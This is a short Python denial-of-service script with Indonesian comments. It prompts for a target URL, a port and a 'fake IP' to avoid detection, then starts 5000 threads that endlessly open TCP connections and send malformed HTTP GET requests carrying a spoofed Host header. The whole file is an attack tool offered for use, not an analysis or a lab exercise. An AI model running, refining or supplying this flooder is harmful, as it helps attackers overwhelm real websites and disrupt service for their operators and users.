import socket
import threading
import os
import sys
import time


URL = input("URL TARGET : ")
PORT = int(input("Masukan Port target : "))
IP2 = input("Masukan Ip palsu biyar gak keditek : ")

try: # convert your url to ip
    IP = socket.gethostbyname(URL)
    print(f"ALAMAT URL dari : {URL}")
    print(f"DAN IP TARGER ADALAH : {IP}")
except socket.gaierror:
    print(f"url wrong bro sory!")
    exit()

# ini adalah pembatasan thread agar gak terjadi error
max_threads = 1100 # batas threads hingga 1100 
semaphore = threading.Semaphore(max_threads)

# main kan sc nya
def main():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((IP, PORT))
            s.sendto(("GET /" + IP + "HTTP/1.1\r\n").encode('ascii'), (IP, PORT))
            s.sendto(("Host: " + IP2 + "\r\n\r\n").encode('ascii'), (IP, PORT))
            s.close()
        except Exception as e :
            print(f"error : {e}")
            time.sleep(20)
            os.system("clear")
            main()
for i in range(5000):
    thread = threading.Thread(target=main)
    thread.start()
